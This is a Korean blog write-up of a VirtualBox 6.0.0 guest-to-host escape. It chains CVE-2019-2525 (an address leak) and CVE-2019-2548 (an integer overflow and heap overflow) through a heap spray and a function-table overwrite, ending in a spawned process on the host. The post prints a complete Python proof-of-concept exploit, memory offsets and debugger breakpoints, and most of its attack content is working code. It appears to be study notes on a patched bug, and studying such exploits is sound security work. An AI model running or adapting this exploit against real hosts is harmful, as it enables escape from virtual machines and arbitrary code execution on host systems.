---
title: VirtualBox 6.0.0 exploit
author: JOSEOYEON
date: 2020-04-01 23:03:27
categories: [SystemHacking, memory leak]
tags: [memory leak]
pin: true
---



# virtual machine(guest)을 공격해서 host Computer의 계산기 call

## 3D 가속화 

![image](https://user-images.githubusercontent.com/46625602/78110008-43ee4980-7435-11ea-85ec-a75614c07983.png)

virtual box는 3d 가속화 기능이 켜져 있어야 한다. 

3d 가속화 기능이 뭐냐면, virtualbox (guest)에서 처리하기 힘든 과부하 걸릴 만한 일을 host os에 넘겨서 처리하고 다시 가져오는 기능이다.

다시 말하면, 3d 기능은 server/client 형식으로 guestOS(virtual machine)안에서 host 컴퓨터 기능을 가져다 써서 원격 랜더링 하는 기능이다.

여기서 사용하는 프로토콜은 hgcm이라고 하는데 이건 드래그앤 드롭 기능을 사용할때도 사용되는 프로토콜이다.

다음 함수들은 hgcm 통신할 때 쓰는 함수들이다.
```
hgcm_connect
hgcm disconnect
hgcm_call(conn_id,function,params)
```


### hgcm_call(conn_id, function, params)
```
==> function:
	SHCRGL_GUEST_FN_WRITE_BUFFER // HEAP buffer alloc 
	SHCRGL_GUEST_FN_WRITE_READ_BUFFER // HEAP buffer free
```	

이 함수의 사용 예를 보면 다음 과 같다

```python
def alloc_buf(client, sz, msg='a'):
    buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, sz, 0, msg]) // 여기는 버퍼에 넣는거 
    return buf

def crmsg(client, msg, bufsz=0x1000):
    ''' Allocate a buffer, write a Chromium message to it, and dispatch it. '''
    assert len(msg) <= bufsz
    buf = alloc_buf(client, bufsz, msg)
    # buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, bufsz, 0, msg]) 
    _, res, _ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf, "A"*bufsz, 1337]) // 여기는 버퍼에서 free
    return res
```

heap에 넣었다 free 하는 걸로 heap spray를 할 수 있다. 

----

## Chromium Library

우리는 3d 기능을 사용하기 위해 해당 기능을 사용할 수 있는 api를 호출하는 것이 필요하고

이 api 라이브러리 이름이 Chromium Library이다.

3d 가속화 기능을 사용하려면 CrUnPack 으로 시작하는 함수를 사용하면 된다. 

> 1. Chromium client(GuestOS)는 opcodes+data로 구성된 rendering command를 Chromium Server로 전송

> 2. Chromium Server(HostOS)는 opcodes+data로 구성된 command를 처리해서 frame buffer에 결과를 저장한다

> 3. Frame Buffer content는 GuestOS의 Chromium으로 다시 전동된다.

전송되는 frame buffer의 구조는 다음과 같다.

## CRMessageOpcodes struct

![image](https://user-images.githubusercontent.com/46625602/78111818-38505200-7438-11ea-93f5-2cd8da2557dc.png)

```python
def non_message() :
    msg = (
	pack("<III", CR_MESSAGE_OPCODES, 0X41414141,1) # type, conn_id, numOpcodes
	+ "\x00\x00\x00" + chr(CR_READPIXELS_OPCODE)  # opcode1
	+ pack("<IIII", 0x41414141, 0x41414141, 0x41414141, 0x41414141)
	)
    return msg
```

이렇게 메시지의 뜻은 CR_READPIXELS_OPCODE(이 opcode에 해당하는  함수)에게  `pack("<IIII", 0x41414141, 0x41414141, 0x41414141, 0x41414141)`를 넣어달라는 뜻이다.


--- 

## CVE-2525, CVE-2548

우리는 CVE-2525, CVE-2548을 이용해서 공격할 것임

*CVE-2525*를 가지고 memory leak을 하고

leak 된 주소를 가지고 offset 을 계산해서 crSpawn, crServerDispatchBoundsInfoCR (호출되는 함수 테이블의 주소) 등등.. 다른 함수의 주소를 알아 낼 수 있다.

*CVE-2548*을 가지고 integer overflow, heapSpray 기법을 활용해서

heap의 다른 영역에 접근할 수 있고 함수 테이블을 조작할 수 있다.

## CVE-2525 memory leak

CVE-2525는 crUnpackEtendGetAttribLocation 함수에서 일어나는 취약점으로

memory leak을 할 수 있다.

```c
void crUnpackExtendGetAttribLocation(void) //packet_length 범위 확인 X
{
 int packet_length = READ_DATA(0, int);
 GLuint program = READ_DATA(8, GLuint);
 const char *name = DATA_POINTER(12, const char);
 SET_RETURN_PTR(packet_length-16); //packet_length-16의 위치의 데이터 16바이트를
Guest로 보냄 packet_length를 확인하는 부분이 없어 memory leak 가능 (CVE 2019-2525)
 SET_WRITEBACK_PTR(packet_length-8);
 cr_unpackDispatch.GetAttribLocation(program, name);
}
```

SET_RETURN_PTR(packet_length-16)는 packet_length - 16에 있는 값을 복사해서 주라는 의미이다.

여기 함수를 보면 패킷 길이에 대한 검사가 없어서 사용자가 입력한 데이터 길이보다 더 뒤, 또는 더 앞에 있는 값을 읽을 수 있다. 

packet_length 체크 안하는 걸로 뭘 할 수 있냐면

memory leak을 할 수 있다.

여기 이런 poc 코드가 있다.

```python
import sys, os
from struct import pack, unpack
print os.path.dirname(__file__)
sys.path.append("./3dpwn/lib")
from chromium import *

def leak_msg(offset):
    msg = ( pack("<III", CR_MESSAGE_OPCODES, 0x00, 1)
            + "\x00\x00\x00" + chr(CR_EXTEND_OPCODE)
            + pack("<I", offset)
            + pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE)
            + pack("<I", 0x00) )
    return msg

if __name__ == "__main__":
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)        

    print " [0] trigger"
    address = crmsg(client, leak_msg(0x00))
    print address.encode("hex")
# EOF
```

> SET_RETURN_PTR(packet_length-16);
> b* crUnpackExtendGetAttribLocation+49

여기다가 break를 걸어놓고 실행시켜서 

rsi를 보면 복사될 값이 보인다. 

rsi 근처에 `_texformat_18`의 주소가 보이는데 

![image](https://user-images.githubusercontent.com/46625602/78119451-6ab37c80-7443-11ea-9b32-5752db16be69.png)

이 `_textformat_18`은 나중에 ASLR을 우회하기 위한 고정점으로 쓰인다.

왜 이런 고정점이 필요하냐면 `_textformat_18`과의 offset을 이용해 `cr_server`의 주소를 구할 수 있는데 이 `cr_server`는 ASLR이 있는 HOST pc에서 정확한 함수로의 주로로 접근하기 위해 필요하다

`cr_server`, `_textormat_18`과의 하위 3바이트는 고정이다. 

![image](https://user-images.githubusercontent.com/46625602/78121146-fa5a2a80-7445-11ea-869a-d0d75f7ef84c.png)

> offset을 계산하자

```
print("cr_server addr : (offset : 0x22edd8)")  - texformat_18 + 0x22edd8 로 부터
print("crSpawn addr : (offset : 0x307418)")    - cr_server - 0x307418로 부터 
```
    
물론 지금은 다음과 같이 패치 되었다

![image](https://user-images.githubusercontent.com/46625602/78117337-81a49f80-7440-11ea-85fe-179eb4931bbd.png)


---
## CVE-2548 integer overflow

integer overflow를 발생시키고 이를 이용하여 heap overflow를 유도해서 위의 leak 주소들을 가지고 함수의 주소를 바꿀 수 있다.

다음은 crServerDispatchReadPixels() 함수의 일부이다

![image](https://user-images.githubusercontent.com/46625602/78121950-01356d00-7447-11ea-9f33-9f8288c235f0.png)

sizeof(*rp) is 0x38

![image](https://user-images.githubusercontent.com/46625602/77729961-373bb100-7043-11ea-9670-02e5da295c2d.png)

// [2]의 msg_len = sizeof(*rp) + (uint32_t)bytes_per_row * height에서 sizeof(*rp)이 0x38이다.

따라서 msg_len(CRVBOXSVCBUFFER_t의 길이)는 0X38이상의 값을 기대할 수 있다. 

integer overflow를 이용해 0x38보다 작거나 같은 값도 만들 수 있다.

crServerDispatchReadPixels 에 들어가는 메시지의 구조는 다음과 같다. 

```c
crServerDispatchReadPixels(GLint x, GLint y, GLsizei width, GLsizei height,
 GLenum format, GLenum type, GLvoid *pixels)
{
 const GLint stride = READ_DATA( 24, GLint );
 const GLint alignment = READ_DATA( 28, GLint );
 const GLint skipRows = READ_DATA( 32, GLint );
 const GLint skipPixels = READ_DATA( 36, GLint );
 const GLint bytes_per_row = READ_DATA( 40, GLint );
 const GLint rowLength = READ_DATA( 44, GLint );
 ```

`msg_len = sizeof(*rp) + (uint32_t)bytes_per_row * height`

를 mem_len 0x20(특별한 구조체의 크기)으로 만들기 위해서 

byte_per_row에 0x1ffffffd를 height에 0x8을 넣어 줘야 한다.

그러면 계산은 이렇게 된다.

> msg_len(1 00000020) = 0x38 + 0x1ffffffd * 0x8

CRMessageReadPixels의 구조에 맞추어서 msg를 생성한다

```python
def make_readpixels_msg(uiId, uiSize):
    msg = (
	pack("<III", CR_MESSAGE_OPCODES, 0X41414141,1) # type, conn_id, numOpcodes
	+ "\x00\x00\x00" + chr(CR_READPIXELS_OPCODE)  # opcode1
	+ pack("<III", 0,0,0) # x, y, width
	+ pack("<I",8) #height
	+ pack("<I",0x35) #format
	+ pack("<I", 0) # type
	+ pack("<IIII",0,0,0,0) # stride, alignment, skipRows, skipPixels
	+ pack("<I", 0x1ffffffd) # bytes_per_row
	+ pack("<I",0) #rowLength
	+ pack("<II", uiId, uiSize) #uiID, uiSize
    )
    return msg
```

변조된 것을 확인해 보기 위해 

`break * crServerDispatchReadPixels+152`

에 브레이크를 걸어서 확인한다.

이 곳은 위 코드 상의

`rp = (CRMessageREADpixels *) crAlooc(msg_len)`

에 해당한다.

![image](https://user-images.githubusercontent.com/46625602/78125858-95ee9980-744c-11ea-87b3-9983ab32ee7f.png)

rax는 전달 인자가 들어가는 곳으로 msg_len이 0x20으로 변조된 것을 알 수 있다. 

하지만 여전히 p/x sizeof(CRMessageHeader)은 0x38이다.

![image](https://user-images.githubusercontent.com/46625602/77729961-373bb100-7043-11ea-9670-02e5da295c2d.png)

----

## CVE-2548 heapSpray

```python
def heapSpray(client):
    buf_ids = []

# make heap 0x20
    for i in range(130):
	buf_ids.append(hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[0, 0x20, 0, "B"*0x20])[0])

# how to free? 0x20
    for i in range(1,60,2) :
	hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf_ids[i], "C"*0x20, 1337])
```

1. `CRVBOXSVBUFFER_t`를 메모리에 Heap Spray한다. 이 때 `alloc_buf`를 사용하는데, 메모리가 연속적으로 할당되기 때문에, 버퍼 구조체의 pData역시 버퍼 구조체 바로 옆에 할당되게 된다.

2. 그러므로 `alloc_buf(client, 0x20)`으로 0x20크기의 `CRVBOXSVBUFFER_t`들을 힙에 많이 할당한다. 

![image](https://user-images.githubusercontent.com/46625602/78130521-6c397080-7454-11ea-9c2d-dc384b74fbfe.png)

3. 짝수개의 Buffer ID를 Free한다.

![image](https://user-images.githubusercontent.com/46625602/78130541-72c7e800-7454-11ea-96b1-8aff6367816d.png)

## Corrupt Chunk (CVE-2019-2548)

1. crServerDispatchReadPixels에서 integer overflow가 일어나는 것을 이용하여 0x20크기의 구조체를 할당한다.

 * bytes_per_row = 0x1FFFFFFD / height = 8 ⇒ 0x100000020

뒤의 interger overflow를 할당하여 msg_len을 0x20으로 속인 뒤에 해당 박스에 0x38 크기의 박스를 할당한다.

2. 위 구조체는 Spray된 힙영역의 중간에 Free된 영역에 삽입되고, 크기가 0x38인 것을 이용하여 0x18만큼 Heap overflow가 발생하여 다음 구조체의 uiID와 uiSize를 수정할 수 있다.

* uiID = 0xdeadbeef / uiSize = 0xffffffff

![image](https://user-images.githubusercontent.com/46625602/78130592-8b380280-7454-11ea-94cc-69012df932e6.png)

3. 수정된 uiID를 가진 구조체를 사용하여 다음 청크를 수정시킬 수 있다. 이 때 uiSize가 0xffffffff이기때문에 다음 청크는 pData까지 원하는 값으로 바꿀 수 있다.

* uiID = 0xcafebabe / uiSize = 0xeeeeeeee / pData = 원하는 값

![image](https://user-images.githubusercontent.com/46625602/78130621-9ab74b80-7454-11ea-9a7a-8a091a974d0e.png)

4. 이제 uiID가 0xdeadbeef인 구조체로 pData를 설정하고 0xcafebabe인 구조체를 이용해 OOB Write 를 수행할 수 있다.


![image](https://user-images.githubusercontent.com/46625602/78112942-e8728a80-7439-11ea-982a-11099fe7bb68.png)

![image](https://user-images.githubusercontent.com/46625602/78113289-78b0cf80-743a-11ea-920c-c4b4679dc5cd.png)

---

## function table 변조하기

```python
def svcfull_msg(addr) :
    msg = (
	pack("<I", 0xdeadcafe) #uiID
	+ pack("<I", 0xeeeeeeee) #uiSize
	+ pack("<Q", addr) #pData
	)
    return msg
    
# overwrite uid, uisize, pdata
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0x30, svcfull_msg(crServerDispatchBoundsInfoCR)])
    print("overwrite crServerDispatchBoundsInfoCR Table addrheap (offset : 0x30)")
```

이 코드는 0xdeadbeef 를 ID로 가지고 있고 size가 0xffffffff인 버퍼에서 pData로 부터 offset이 0x30인 곳에 id가 0xdeadcafe, 0xeeeeeeee인 버퍼로 덮어 씌운다. 이곳의 pdata 주소는 crServerDispatchBoundsInfoCR 으로 funtion table에 crServerDispatchBoundsInfoCR 주소가 담겨져 있는 주소로 간다. 

![image](https://user-images.githubusercontent.com/46625602/78138626-356a5700-7462-11ea-9990-d0c7a7de95ba.png)

![image](https://user-images.githubusercontent.com/46625602/78138778-6d719a00-7462-11ea-8bbe-f451bd541f81.png)

after function table 변조

![image](https://user-images.githubusercontent.com/46625602/78138827-837f5a80-7462-11ea-80b9-1bb3cb929259.png)


![image](https://user-images.githubusercontent.com/46625602/78140772-7b74ea00-7465-11ea-9185-a050522e8571.png)


```python
def xcalc(addr) :
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        +"\x00\x00\x00" + chr(CR_BOUNDSINFOCR_OPCODE)
        + pack("<I",0)
        + "xcalc\x00\x20\x20\x20\x20\x20\x20\x20\x20"
        + "111111"
        + pack("<Q", addr) # xcalc argv
        )
    return msg
```

![image](https://user-images.githubusercontent.com/46625602/78141603-b1ff3480-7466-11ea-80a8-b6faf3f850a8.png)

**play screen Shot**

![image](https://user-images.githubusercontent.com/46625602/78145208-9185a900-746b-11ea-950e-2e98a23ad91e.png)

---

전체 POC 코드 

```python
import sys, os
from struct import pack, unpack
sys.path.append(os.path.abspath(os.path.dirname(__file__))+'/lib')
from chromium import *

def non_message() :
    msg = (
	pack("<III", CR_MESSAGE_OPCODES, 0X41414141, 1)
	+ "\x00\x00\x00" + chr(CR_NOP_OPCODE)
	+ pack("<IIII", 0x41414141, 0x41414141, 0x41414141, 0x41414141)
	)
    return msg

# leak addr
def leak_msg(offset):
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) # type, conn_id, numOpcodes
        + '\x00\x00\x00' + chr(CR_EXTEND_OPCODE) # opcode1
        + pack("<I", offset) # packet_length
        + pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE) # sub opcode, program
        + pack("<I", 0xdeaddead) # name
        )
    return msg

# from leak addr, calc cr_server, crSpawn
def read_addr(res) :
    read_line = 0
    while(read_line <= 0x90) :
        leak_addr = res[read_line:read_line+8]
	leak_addr = unpack('Q',leak_addr)[0] #unpack(long long, string)
        print (hex(leak_addr))
        if((leak_addr > 0x7f0000000000)and((leak_addr) < 0x7fffffffffff)):
	    return ((leak_addr + 0x22edd8), (leak_addr - 0x307418))
        read_line = read_line + 8
    return (0,0)

# server dispatch_table
# integer overflow len 0x20
def make_readpixels_msg(uiId, uiSize):
    msg = (
	pack("<III", CR_MESSAGE_OPCODES, 0X41414141,1) # type, conn_id, numOpcodes
	+ "\x00\x00\x00" + chr(CR_READPIXELS_OPCODE)  # opcode1
	+ pack("<III", 0,0,0) # x, y, width
	+ pack("<I",8) #height
	+ pack("<I",0x35) #format, type, pixls, heap chunk
	+ pack("<I",0)
	+ pack("<IIII",0,0,0,0) # stride, alignment, skipRows, skipPixels
	+ pack("<I", 0x1ffffffd) # bytes_per_row
	+ pack("<I",0) #rowLength
	+ pack("<II", uiId, uiSize) #uiID, uiSize
    )
    return msg

def heapSpray(client):
    buf_ids = []

# make heap 0x20
    for i in range(130):
	buf_ids.append(hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[0, 0x20, 0, "B"*0x20])[0])

# how to free? 0x20
    for i in range(1,60,2) :
	hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf_ids[i], "C"*0x20, 1337])

#crvBoxSvcBuffer
def svcfull_msg(addr) :
    msg = (
	pack("<I", 0xdeadcafe) #uiID
	+ pack("<I", 0xeeeeeeee) #uiSize
	+ pack("<Q", addr) #pData
	)
    return msg

def xcalc(addr) :
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        +"\x00\x00\x00" + chr(CR_BOUNDSINFOCR_OPCODE)
        + pack("<I",0)
        + "xcalc\x00\x20\x20\x20\x20\x20\x20\x20\x20"
        + "111111"
        + pack("<Q", addr) # xcalc argv
        )
    return msg

if __name__=='__main__':
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)
    msg = leak_msg(0x90)
    res = crmsg(client, msg)

# find cr_server and crSpawn from leak addr
    cr_server, crSpawn = read_addr(res)
    cr_server = 0x7fa68e85a700
    crServerDispatchBoundsInfoCR = cr_server + 0xae98
    crSpawn = 0x7fa68e324510
    print("cr_server addr : (offset : 0x22edd8)")
    print hex(cr_server)
    print("crSpawn addr : (offset : 0x307418)")
    print hex(crSpawn)
    print("crServerDispatchBoundsInfoCR Table addr : (offset : cr_server + 0xae98, 0x2d7650)")
    print hex(crServerDispatchBoundsInfoCR)

# heap spray
    heapSpray(client)
    print("heapSpray end")

# Trigger to CVE-2019-2548
    msg = make_readpixels_msg(0xdeadbeef, 0xffffffff) # 0x20 heap buffer change
    crmsg(client, msg)

# overwrite uid, uisize, pdata
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0x30, svcfull_msg(crServerDispatchBoundsInfoCR)])
    print("overwrite crServerDispatchBoundsInfoCR Table addrheap (offset : 0x30)")
    msg = leak_msg(0x30)

# overwrite crServerDispatchBoundsInfo to crSpawn
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadcafe, 0xeeeeeeee, 0, pack("<Q", crSpawn)])
    print("overwrite crServerDispatchBoundsInfoCR in heap to crSpawn")
    msg = leak_msg(0x30)

# xcalc call
    msg = xcalc(crSpawn)
    crmsg(client, msg)
```
---
## Break Point

### address leak breakpoint
`break *crUnpackExtendGetAttribLocation+49`

### other breakpoint
`break crServerDispatchReadPixels`

`break *crServerDispatchReadPixels +302`

`break *cr_unpackDispatch + 216`

`break *crServerDispatchBoundsInfoCR`

`break *crUnpackBoundsInfoCR+78` #execvp

---
**[Referance]**

* heap 을 보고 싶은데 gdb에서 
[https://github.com/scwuaptx/Pwngdb](https://github.com/scwuaptx/Pwngdb)

* 내용 요약
[https://docs.google.com/document/d/1RQg726a8Tv04jyJTM0ielxskFtavRRXQA1o2yBWFiPA/edit](https://docs.google.com/document/d/1RQg726a8Tv04jyJTM0ielxskFtavRRXQA1o2yBWFiPA/edit)

* github 실습 내용 정리
[https://github.com/cosdong7/VirtualBox-6.0.0-exploit/blob/master/CVE%202019-2525%20%26%20CVE%202019-2548%20working%20exploit.pdf](https://github.com/cosdong7/VirtualBox-6.0.0-exploit/blob/master/CVE%202019-2525%20%26%20CVE%202019-2548%20working%20exploit.pdf)

* github 실습 내용 정리 (2)
[https://github.com/wotmd/VirtualBox-6.0.0-Exploit-1-day](https://github.com/wotmd/VirtualBox-6.0.0-Exploit-1-day)

* 실습 내용 정리 (3)
[https://rond-o.tistory.com/42](https://rond-o.tistory.com/42)

